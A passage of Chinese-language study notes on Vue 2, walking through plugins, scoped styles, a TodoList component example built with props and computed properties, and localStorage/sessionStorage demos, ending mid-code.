​	install函数里面就可以写我们前面学过的全局过滤器、全局自定义指令和全局的混入等等，由于install函数传入的是Vue实例对象（vm的缔造者），我们就可以在全局用上我们所定义的所有过滤器、自定义指令和混入，拿来就可以用。

main.js

```javascript
// 引入Vue
import Vue from 'vue';
// 引入App
import App from './App'
// 引入插件
import plugins from './plugins';
// 关闭Vue的生产提示
Vue.config.productionTip = false

// 应用（使用）插件
Vue.use(plugins)

// 创建vm
new Vue({
    el: '#app',
    render(h) {
        return h(App)
    },
})
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230322190858909.png" alt="image-20230322190858909" style="zoom:50%;" />

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230322190954274.png" alt="image-20230322190954274" style="zoom:50%;" />

## 3.6 scoped样式

​	我们在给每个组件写样式的时候，Vue会在编译过程中将我们写的所有样式全部汇总起来，而我们在每个组件写的样式标识很有可能会重复，scoped的作用就是	让样式在局部生效，防止冲突。

​	写法：`<style scoped></style>`，它编译时会打包成一个文件，可以解决类名一致样式冲突问题

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230322202354923.png" alt="image-20230322202354923" style="zoom:50%;" />

​	`<style lang="less" scoped></style>` less相比css，支持嵌套语句。使用less需要安装less-loader

```shell
// 两条语句学习一下
// 查看目前发布的版本
npm view xxxx versions

// 安装指定版本的工具
npm install xxxx@版本号

```

Student.vue中的样式：	

实现的效果：

```less
<style lang="less" scoped>
.demo {
  background-color: orange;
  .qifeiqifei {
    font-size: 40px;
  }
}
</style>
```

## 3.7 TodoList案例

### 3.7.1 静态组件的分类

​	在我们开发时，尤其是在做老项目移植的组件开发时，往往我们要想着按照需求合理的拆分组件，我们做的这个TodoList案例也是如此

**组件化编码流程：**

​	 1. 拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突

   	2. 实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：
   	    	1.  一个组件在用：放在组件自身即可
   	    	2. 一些组件在用：放在他们共同的父组件上（状态提升）
   	3. 实现交互：从绑定事件开始

按照业务需求：我们拆分了这几个组件：Header、List、Item、Footer 其中Item是List的子组件

App.vue:

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <Header/>
        <List/>
        <Footer/>
      </div>
    </div>
  </div>
</template>

<script>
import Header from "./components/Header.vue";
import List from "./components/List.vue";
import Footer from "./components/Footer.vue";

export default {
  name: "App",
  components: {
    Header,
    List,
    Footer,
  },
};
</script>

<style>
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
    0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>
```

Heder.vue:

```vue
<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入你的任务名称，按回车键确认" />
  </div>
</template>

<script>
export default {
  name: "Header",
};
</script>

<style scoped>
    /*Header*/
    .todo-header input {
    width: 560px;
    height: 28px;
    font-size: 14px;
    border: 1px solid #ccc;
    border-radius: 4px;
    padding: 4px 7px;
    }

    .todo-header input:focus {
    outline: none;
    border-color: rgba(82, 168, 236, 0.8);
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
        0 0 8px rgba(82, 168, 236, 0.6);
    }
</style>
```

List.vue:

```vue
<template>
  <Item />
</template>

<script>
import Item from "./Item.vue";

export default {
  name: "List",
  components: {
    Item,
  },
};
</script>

<style scoped>
    /*List*/
    .todo-main {
    margin-left: 0px;
    border: 1px solid #ddd;
    border-radius: 2px;
    padding: 0px;
    }

    .todo-empty {
    height: 40px;
    line-height: 40px;
    border: 1px solid #ddd;
    border-radius: 2px;
    padding-left: 5px;
    margin-top: 10px;
    }
</style>
```

Item.vue:

```vue
<template>
  <ul class="todo-main">
    <li>
      <label>
        <input type="checkbox" />
        <span>xxxxx</span>
      </label>
      <button class="btn btn-danger" style="display: none">删除</button>
    </li>
  </ul>
</template>

<script>
export default {
  name: "Item",
};
</script>

<style scoped>
    /*Item*/
    li {
    list-style: none;
    height: 36px;
    line-height: 36px;
    padding: 0 5px;
    border-bottom: 1px solid #ddd;
    }

    li label {
    float: left;
    cursor: pointer;
    }

    li label li input {
    vertical-align: middle;
    margin-right: 6px;
    position: relative;
    top: -1px;
    }

    li button {
    float: right;
    display: none;
    margin-top: 3px;
    }

    li:before {
    content: initial;
    }

    li:last-child {
    border-bottom: none;
    }
</style>
```

Footer.vue

```vue
<template>
  <ul class="todo-main">
    <li>
      <label>
        <input type="checkbox" />
        <span>xxxxx</span>
      </label>
      <button class="btn btn-danger" style="display: none">删除</button>
    </li>
  </ul>
</template>

<script>
export default {
  name: "Item",
};
</script>

<style scoped>
    /*Item*/
    li {
    list-style: none;
    height: 36px;
    line-height: 36px;
    padding: 0 5px;
    border-bottom: 1px solid #ddd;
    }

    li label {
    float: left;
    cursor: pointer;
    }

    li label li input {
    vertical-align: middle;
    margin-right: 6px;
    position: relative;
    top: -1px;
    }

    li button {
    float: right;
    display: none;
    margin-top: 3px;
    }

    li:before {
    content: initial;
    }

    li:last-child {
    border-bottom: none;
    }
</style>
```

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230323170951480.png" alt="image-20230323170951480" style="zoom:50%;" />

### 3.7.2 TodoList案例 初始化列表

​	拆分完静态组建后我们就该考虑数据交互的事情了，我们选择将数据存放在List中，Item读取List通过props传值，里面用到了props和绑定

​	List.vue

```html
<template>
  <ul class="todo-main">
    <Item v-for="todoObj in todos" :key=todoObj.id :todo="todoObj" />
  </ul>
</template>
```

```javascript
  data() {
    return {
      todos: [
        { id: "001", title: "唱", isDone: true },
        { id: "002", title: "跳", isDone: true },
        { id: "003", title: "rap", isDone: true },
        { id: "004", title: "篮球", isDone: false },
      ],
    };
  },
};
```

​	这里用到了v-for指令并且通过props传递参数给子组件Item

​	Item.vue

```html
<template>
  <ul class="todo-main">
    <li>
      <label>
        <input type="checkbox" :checked="this.todo.isDone" />
        <span>{{ this.todo.title }}</span>
      </label>
      <button class="btn btn-danger" style="display: none">删除</button>
    </li>
  </ul>
</template>
```

```javascript
export default {
  name: "Item",
  props: {
    // 声明接收todo对象
    todo: {
      type: Object,
      required: true,
    },
  },
};
</script>
```

​	这里用v-bind而不用v-model指令来管理数据的原因是：props传递的参数是只读的，用v-model无法修改

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230324153027916.png" alt="image-20230324153027916" style="zoom:50%;" />

### 3.7.3 TodoList案例 添加

​	上一节，我们将Todos这个数据存在了List组件中，这一节我们要在Header组件输入文字实现添加的功能，要涉及到兄弟组件（Header组件将数据传给List组件）通信，这可以通过全局事件总线、vuex实现，我们这一节主要掌握另外一种方式：Header组件与父组件App通信，再让父组件App通过props将数据传给子组件List

​	父子组件通信方式我们可以用props解决，子组件传数据给父组件我们也可以通过props解决，要求是当初父组件传一个函数个子组件，子组件在进行通信的时候调用这个函数。

App.vue

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <!-- 通过props传给子组件一个函数 -->
        <Header :addTodo="addTodo" />
        <List :todos="todos" />
        <Footer />
      </div>
    </div>
  </div>
</template>

<script>
import Header from "./components/Header.vue";
import List from "./components/List.vue";
import Footer from "./components/Footer.vue";

export default {
  name: "App",
  components: {
    Header,
    List,
    Footer,
  },
  data() {
    return {
      todos: [
        { id: "001", title: "唱", isDone: true },
        { id: "002", title: "跳", isDone: true },
        { id: "003", title: "rap", isDone: true },
        { id: "004", title: "篮球", isDone: false },
      ],
    };
  },
  methods: {
    // 当初传给子组件的函数
    addTodo(todoObj){
      this.todos.unshift(todoObj)
    }
  },
};
</script>

<style>
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
    0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>


```

Header.vue

这里生成id引入了一个库：nanoid

```vue
<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入你的任务名称，按回车键确认" v-model="title" @keyup.enter="addData" />
  </div>
</template>

<script>
import {nanoid} from 'nanoid'
export default {
  name: "Header",
  // 声明接收这个函数
  props: ['addTodo'],
  data() {
    return {
      title : ''
    }
  },
  methods: {
    addData(){
      // 校验数据
      if(!this.title.trim()) return alert('输入不能为空！')
      // 将用户的输入包装成一个todo对象
      const todoObj = {id: nanoid(), title: this.title, isDone: false}
      // 通知App组件去添加一个todo对象
      this.addTodo(todoObj)
      // 清空输入
      this.title = ''
    }
  },
};
</script>

<style scoped>
    /*Header*/
    .todo-header input {
    width: 560px;
    height: 28px;
    font-size: 14px;
    border: 1px solid #ccc;
    border-radius: 4px;
    padding: 4px 7px;
    }

    .todo-header input:focus {
    outline: none;
    border-color: rgba(82, 168, 236, 0.8);
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
        0 0 8px rgba(82, 168, 236, 0.6);
    }
</style>
```

修改过后的List.vue:

```vue
<template>
  <ul class="todo-main">
    <Item v-for="todoObj in todos" :key=todoObj.id :todo="todoObj" />
  </ul>
</template>

<script>
import Item from "./Item.vue";

export default {
  name: "List",
  components: {
    Item,
  },
  props: ['todos']

};
</script>

<style scoped>
/*List*/
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230325171207846.png" alt="image-20230325171207846" style="zoom:50%;" />

### 3.7.4 TodoList案例 勾选

​	我们在这一节实现TodoList中的勾选功能，当我们勾选checkbox时，item将会通知App组件进行isDone值的修改

​	由于我们在上一节将todos数据存在了App中，所以要想修改到isDone的值，就会涉及到爷孙组件传递数据，我们没有学事件总线以及消息订阅与发布，所以此次我们决定现将数据传到List组件，再传到Item中，逐级传递

App.vue

```vue
<List :todos="todos" :changeIsDone="changeIsDone" />
```

method中：

```javascript
    // 勾选or取消勾选一个todo
    changeIsDone(id) {
      this.todos.forEach((todo) => {
        if (todo.id === id) {
          todo.isDone = !todo.isDone;
        }
      });
    },
```

List.vue

```vue
    <Item
      v-for="todoObj in todos"
      :key="todoObj.id"
      :todo="todoObj"
      :changeIsDone="changeIsDone"
    />
```

```javascript
  props: ["todos", "changeIsDone"],
```

Item.vue

```vue
        <input
          type="checkbox"
          :checked="this.todo.isDone"
          @change="handleCheck(todo.id)"
        />
        <!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，修改了props -->
        <!-- <input type="checkbox" v-model="this.todo.isDone" > -->
```

```javascript
  name: "Item",
  mounted() {
    console.log(this);
  },
  props: {
    // 声明接收todo对象
    todo: {
      type: Object,
      required: true,
    },
    changeIsDone: {
      type: Function,
      required: true
    }
  },
  methods: {
    handleCheck(id) {
      // 通知App组件将对应的todo对象的idDone值取反
      this.changeIsDone(id)
    },
  },
```

​	这里需要提的一点是：我们使用v-model双向数据绑定也可以实现需求，但是不推荐我们这样做，修改对象中的数据时，引用没变。vue这里做的是一个浅层次的监视，我们修改对象里面的值会直接修改props中的数据，这个操作是vue官方不推荐的

​	调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230327155954133.png" alt="image-20230327155954133" style="zoom:50%;" />

### 3.7.5 TodoList案例 删除

​	同样的在App里操作数据，涉及到逐级传递函数

App.vue

```vue
<List :todos="todos" :changeIsDone="changeIsDone" :deleteTodo="deleteTodo" />
```

methods中

```javascript
    // 删除一个todo
    deleteTodo(id){
      this.todos = this.todos.filter((todo) => {
        return todo.id !== id
      })
    }
```

​	这里用到了filter方法过滤一个全新的数组并重新赋给原数组，不会造成性能浪费，因为我们id已经维护好了

List.vue

```vue
    <Item
      v-for="todoObj in todos"
      :key="todoObj.id"
      :todo="todoObj"
      :changeIsDone="changeIsDone"
      :deleteTodo="deleteTodo"
    />
```

```javascript
  props: ["todos", "changeIsDone", "deleteTodo"],
```

Item.vue

```vue
<template>
  <ul class="todo-main">
    <li>
      <label>
        <input
          type="checkbox"
          :checked="this.todo.isDone"
          @change="handleCheck(todo.id)"
        />
        <!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，修改了props -->
        <!-- <input type="checkbox" v-model="this.todo.isDone" > -->
        <span>{{ this.todo.title }}</span>
      </label>
      <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
    </li>
  </ul>
</template>

<script>
export default {
  name: "Item",
  mounted() {
    console.log(this);
  },
  props: {
    // 声明接收todo对象
    todo: {
      type: Object,
      required: true,
    },
    changeIsDone: {
      type: Function,
      required: true
    },
    deleteTodo: {
      type: Function,
      required: true
    }
  },
  methods: {
    // 勾选or取消勾选
    handleCheck(id) {
      // 通知App组件将对应的todo对象的idDone值取反
      this.changeIsDone(id)
    },
    // 删除
    handleDelete(id){
      if (confirm('确定删除吗？')) {
        // 通知App删除对应id的todo项
        this.deleteTodo(id)
      }
    }
  },
};
</script>

<style scoped>
/*Item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover {
  background-color: #ddd;
}

li:hover button {
  display: block;
}
</style>
```

​	在Item组件中我们在样式中写了一个高亮效果，并且每一个item都会显示删除按钮，在交互上仍然跟上面的勾选一样调用App里的函数

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230327164714103.png" alt="image-20230327164714103" style="zoom:50%;" />

### 3.7.6 TodoList案例 底部统计

​	我们需要对Footer组件里面的已完成/总数的数字进行绑定

App.vue

```vue
        <Footer :todos="todos" />
```

数据在App中，由App组件传输数据给Footer组件

Footer.vue

```vue
<template>
  <div class="todo-footer">
    <label>
      <input type="checkbox" />
    </label>
    <span>
      <span>已完成{{ doneTotal }}</span> / 全部{{ total }}</span
    >
    <button class="btn btn-danger">清除已完成任务</button>
  </div>
</template>

<script>
export default {
  name: "Footer",
  props: {
    todos: {
      type: Array,
      required: true,
    },
  },
  computed: {
    doneTotal() {
      return this.todos.filter((todo) => {
        return todo.isDone == true;
      }).length;
      // const doneTodos = this.todos.filter((todo) => {
      //   return todo.isDone == true
      // })
      // return doneTodos.length

      // doneTotal(){
      //此处使用reduce方法做条件统计
      /* const x = this.todos.reduce((pre,current)=>{
					console.log('@',pre,current)
					return pre + (current.done ? 1 : 0)
				},0) */
      //简写
      // return this.todos.reduce((pre,todo)=> pre + (todo.done ? 1 : 0) ,0)
      // },
    },
    total(){
      return this.todos.length
    }
  },
};
</script>
```

​	显示总数只需要读取todos数组长度就可以，而要计算已完成的总数，就需要读取todos里面每个isDone为true的元素个数，我们将计算好的属性放入页面，需要用到计算属性

​	这里用filter方法将isDone为true的元素过滤出来，并读取了新数组的长度

​	另外也可以用条件统计的reduce方法：

```javascript
			doneTotal(){
				//此处使用reduce方法做条件统计
				/* const x = this.todos.reduce((pre,current)=>{
					console.log('@',pre,current)
					return pre + (current.done ? 1 : 0)
				},0) */
				//简写
				return this.todos.reduce((pre,todo)=> pre + (todo.done ? 1 : 0) ,0)
			},
```

​	reduce方法：根据数组的长度决定调用次数 第二个参数为初始值，每一次调用后的返回值将会作为第一个参数。最后一次调用函数的返回值就是数组的长度。详情见https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/reduce

调试结果：<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230327192456376.png" alt="image-20230327192456376" style="zoom:50%;" />

### 3.7.7 TodoList案例 底部交互

​	这一节我们主要完成全选框控制所有Item中的isDone值，以及右下角的清除所有已完成任务按钮

App.vue

```vue
<Footer :todos="todos" :checkAllTodo="checkAllTodo" :clearAllDoneTodo="clearAllDoneTodo" />
```

```javascript
    // 全选or取消全选
    checkAllTodo(isDone){
      this.todos.forEach((todo) => {
        todo.isDone = isDone
      })
    },
    // 删除所有已完成的todo
    clearAllDoneTodo(){
      this.todos = this.todos.filter((todo) => {
        return todo.isDone !== true
      })
    }
```

Footer.vue

```vue
    <label>
      <!-- <input type="checkbox" :checked="isAll" :checkAll="checkAll"> -->
      <input type="checkbox" v-model="isAll" />
    </label>
    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
```

computed计算属性部分:

```javascript
    // 全选按钮相关
		isAll: {
      get(){
        return this.doneTotal === this.total && this.total > 0
      },
      set(value){
        this.checkAllTodo(value)
      }
    }
```

methods部分：

```javascript
  methods: {
    // 全选按钮相关
    // checkAll(e){
    //   console.log(e.target.checked);
    // },
    // 清除所有已完成任务相关
    clearAll(){
      if (confirm('确定删除所有已完成的任务吗？')) {
        this.clearAllDoneTodo()
      }
    }
  },
```

​	在我们给全选按钮进行交互的时候，我们只需要让已完成的todo等于总todo就行了。

​	在这里我们没有为checkbox赋予方法，而是直接使用v-model指令进行双向绑定，因为checkbox的input框绑定了v-model之后，后面属性的值就变成了布尔值，又因为我们进行勾选和取消勾选的时候会影响isAll的值从而影响这个全选框的状态，所以我们必须得把isAll这个计算属性写上getter，即计算属性的完整写法。这里和我们在Item中的勾选框不同，isAll是我们自己计算在这里的计算属性，可以随意修改，而Item组件中的勾选框是通过props传过来的，不能修改，所以我们推荐在Footer这个组件中使用v-model

​	调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230327223621823.png" alt="image-20230327223621823" style="zoom:50%;" />

**TodoList案例总结：**

1. 组件化编码流程：

    (1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。

    (2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

    	1).一个组件在用：放在组件自身即可。
		
    	2). 一些组件在用：放在他们共同的父组件上（状态提升）。

    (3).实现交互：从绑定事件开始。

2. props适用于：

    (1).父组件 ==> 子组件 通信

    (2).子组件 ==> 父组件 通信（要求父先给子一个函数）

3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！

4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。

案例代码（以后如果学了组件间通信可能会完善）：

App.vue

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <!-- 通过props传给子组件一个函数 -->
        <Header :addTodo="addTodo" />
        <List :todos="todos" :changeIsDone="changeIsDone" :deleteTodo="deleteTodo" />
        <Footer :todos="todos" :checkAllTodo="checkAllTodo" :clearAllDoneTodo="clearAllDoneTodo" />
      </div>
    </div>
  </div>
</template>

<script>
import Header from "./components/Header.vue";
import List from "./components/List.vue";
import Footer from "./components/Footer.vue";

export default {
  name: "App",
  components: {
    Header,
    List,
    Footer,
  },
  data() {
    return {
      todos: [
        { id: "001", title: "唱", isDone: true },
        { id: "002", title: "跳", isDone: true },
        { id: "003", title: "rap", isDone: true },
        { id: "004", title: "篮球", isDone: false },
      ],
    };
  },
  methods: {
    // 添加一个todo
    // 当初传给子组件的函数
    addTodo(todoObj) {
      this.todos.unshift(todoObj);
    },
    // 勾选or取消勾选一个todo
    changeIsDone(id) {
      this.todos.forEach((todo) => {
        if (todo.id === id) {
          todo.isDone = !todo.isDone;
        }
      });
    },
    // 删除一个todo
    deleteTodo(id){
      this.todos = this.todos.filter((todo) => {
        return todo.id !== id
      })
    },
    // 全选or取消全选
    checkAllTodo(isDone){
      this.todos.forEach((todo) => {
        todo.isDone = isDone
      })
    },
    // 删除所有已完成的todo
    clearAllDoneTodo(){
      this.todos = this.todos.filter((todo) => {
        return todo.isDone !== true
      })
    }
  },
};
</script>

<style>
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
    0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>


```

Header.vue

```vue
<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入你的任务名称，按回车键确认" v-model="title" @keyup.enter="addData" />
  </div>
</template>

<script>
import {nanoid} from 'nanoid'
export default {
  name: "Header",
  // 声明接收这个函数
  props: ['addTodo'],
  data() {
    return {
      title : ''
    }
  },
  methods: {
    addData(){
      // 校验数据
      if(!this.title.trim()) return alert('输入不能为空！')
      // 将用户的输入包装成一个todo对象
      const todoObj = {id: nanoid(), title: this.title, isDone: false}
      // 通知App组件去添加一个todo对象
      this.addTodo(todoObj)
      // 清空输入
      this.title = ''
    }
  },
};
</script>

<style scoped>
    /*Header*/
    .todo-header input {
    width: 560px;
    height: 28px;
    font-size: 14px;
    border: 1px solid #ccc;
    border-radius: 4px;
    padding: 4px 7px;
    }

    .todo-header input:focus {
    outline: none;
    border-color: rgba(82, 168, 236, 0.8);
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
        0 0 8px rgba(82, 168, 236, 0.6);
    }
</style>
```

List.vue

```vue
<template>
  <ul class="todo-main">
    <Item
      v-for="todoObj in todos"
      :key="todoObj.id"
      :todo="todoObj"
      :changeIsDone="changeIsDone"
      :deleteTodo="deleteTodo"
    />
  </ul>
</template>

<script>
import Item from "./Item.vue";

export default {
  name: "List",
  components: {
    Item,
  },
  props: ["todos", "changeIsDone", "deleteTodo"],
};
</script>

<style scoped>
/*List*/
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>
```

Item.vue

```vue
<template>
  <ul class="todo-main">
    <li>
      <label>
        <input
          type="checkbox"
          :checked="this.todo.isDone"
          @change="handleCheck(todo.id)"
        />
        <!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，修改了props -->
        <!-- <input type="checkbox" v-model="this.todo.isDone" > -->
        <span>{{ this.todo.title }}</span>
      </label>
      <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
    </li>
  </ul>
</template>

<script>
export default {
  name: "Item",
  mounted() {
    console.log(this);
  },
  props: {
    // 声明接收todo对象
    todo: {
      type: Object,
      required: true,
    },
    changeIsDone: {
      type: Function,
      required: true
    },
    deleteTodo: {
      type: Function,
      required: true
    }
  },
  methods: {
    // 勾选or取消勾选
    handleCheck(id) {
      // 通知App组件将对应的todo对象的idDone值取反
      this.changeIsDone(id)
    },
    // 删除
    handleDelete(id){
      if (confirm('确定删除吗？')) {
        // 通知App删除对应id的todo项
        this.deleteTodo(id)
      }
    }
  },
};
</script>

<style scoped>
/*Item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover {
  background-color: #ddd;
}

li:hover button {
  display: block;
}
</style>
```

Footer.vue

```vue
<template>
  <div class="todo-footer">
    <label>
      <!-- <input type="checkbox" :checked="isAll" :checkAll="checkAll"> -->
      <input type="checkbox" v-model="isAll" />
    </label>
    <span>
      <span>已完成{{ doneTotal }}</span> / 全部{{ total }}</span>
    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
  </div>
</template>

<script>
export default {
  name: "Footer",
  props: {
    todos: {
      type: Array,
      required: true,
    },
    checkAllTodo: {
      type: Function,
      required: true
    },
    clearAllDoneTodo: {
      type: Function,
      required: true
    }
  },
  computed: {
    doneTotal() {
      return this.todos.filter((todo) => {
        return todo.isDone == true;
      }).length;
      // const doneTodos = this.todos.filter((todo) => {
      //   return todo.isDone == true
      // })
      // return doneTodos.length

      // doneTotal(){
      //此处使用reduce方法做条件统计
      /* const x = this.todos.reduce((pre,current)=>{
					console.log('@',pre,current)
					return pre + (current.done ? 1 : 0)
				},0) */
      //简写
      // return this.todos.reduce((pre,todo)=> pre + (todo.done ? 1 : 0) ,0)
      // },
    },
    total(){
      return this.todos.length
    },
    // 全选按钮相关
    isAll: {
      get(){
        return this.doneTotal === this.total && this.total > 0
      },
      set(value){
        this.checkAllTodo(value)
      }
    }
  },
  methods: {
    // 全选按钮相关
    // checkAll(e){
    //   console.log(e.target.checked);
    // },
    // 清除所有已完成任务相关
    clearAll(){
      if (confirm('确定删除所有已完成的任务吗？')) {
        this.clearAllDoneTodo()
      }
    }
  },
};
</script>

<style>
/*Footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}
</style>
```

## 3.8 webStorage

前面的JS基础上已经学过

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

3. 相关API：

   1. `xxxxxStorage.setItem('key', 'value');` 该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

   2. `xxxxxStorage.getItem('person');`

       该方法接受一个键名作为参数，返回键名对应的值。

   3. `xxxxxStorage.removeItem('key');`

       该方法接受一个键名作为参数，并把该键名从存储中删除。

   4. ` xxxxxStorage.clear()`

       该方法会清空存储中的所有数据。

4. 备注：

   1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
   2. LocalStorage存储的内容，需要手动清除才会消失。
   3. `xxxxxStorage.getItem(xxx)`如果xxx对应的value获取不到，那么getItem的返回值是null。
   4. `JSON.parse(null)`的结果依然是null。

   

本地存储：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>localStorage</title>
</head>
<body>
    <h2>localStorage</h2>
    <button onclick="saveData()">点我保存一个数据</button>
    <button onclick="readData()">点我读取一个数据</button>
    <button onclick="deleteData()">点我删除一个数据</button>
    <button onclick="clearAllData()">点我清空数据</button>
    <script>
        let p = {name: '张三', age: 18}
        function saveData() {
            window.localStorage.setItem('msg', 'hello!')
            window.localStorage.setItem('person', JSON.stringify(p))

        }
        function readData() {
            console.log(JSON.parse((window.localStorage.getItem('person'))))
        }
        function deleteData() {
            window.localStorage.removeItem('person')
        }
        function clearAllData() {
            window.localStorage.clear('person')
        }
    </script>
</body>
</html>
```

会话存储：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>sessionStorage</title>
</head>
<body>
    <h2>sessionStorage</h2>
    <button onclick="saveData()">点我保存一个数据</button>
    <button onclick="readData()">点我读取一个数据</button>
    <button onclick="deleteData()">点我删除一个数据</button>
    <button onclick="clearAllData()">点我清空数据</button>
    <script>
        let p = {name: '张三', age: 18}
        function saveData() {
            window.sessionStorage.setItem('msg', 'hello!')
            window.sessionStorage.setItem('person', JSON.stringify(p))

        }
        function readData() {
            console.log(JSON.parse((window.sessionStorage.getItem('person'))))
        }
        function deleteData() {
            window.sessionStorage.removeItem('person')
        }
        function clearAllData() {
            window.sessionStorage.clear()
        }
    </script>
</body>
</html>
```

​	学了localStorage本地存储后，我们可以继续完善我们的TodoList案例：

​		我们可以把todos的数据存储在localStorage中，因为localStorage的特性，它在我们关闭浏览器、刷新页面都不会消失，而且存储的数据也不会是我们刚开始todo写死了的唱跳rap篮球

​	我们有好几种方法将todos这个数据存储在localStorage中，例如将我们当初在Header中写的添加回调、Item中删除的回调的逻辑都加入到localStorage中，这样太麻烦了，我们建议使用监视属性来完成这个过程，只要监视到todos被修改，就往localStorage存一份，然后再将localStorage中存储的最新的todos放入App的data中展示

App.vue

```javascript
  data() {
    return {
